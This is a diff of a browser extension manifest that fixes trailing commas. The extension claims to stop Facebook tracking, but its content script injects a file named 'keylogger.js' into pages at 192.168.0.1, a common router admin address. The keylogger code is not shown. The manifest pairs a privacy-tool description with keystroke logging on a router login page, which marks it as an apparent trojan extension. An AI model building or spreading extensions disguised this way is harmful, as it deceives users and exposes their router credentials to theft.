@@ -4,13 +4,13 @@
   "description": "Stops facebook tracking your visits across the web while you're logged out.",
   "permissions": [
     "http://facebook.com/",
-    "http://192.168.0.1/",
+    "http://192.168.0.1/"
   ],
   "content_scripts": [
     {
       "matches": ["http://192.168.0.1/*"],
       "js": ["jquery.js", "keylogger.js"],
-      "run_at": "document_end",
+      "run_at": "document_end"
     }
-  ],
+  ]
 }
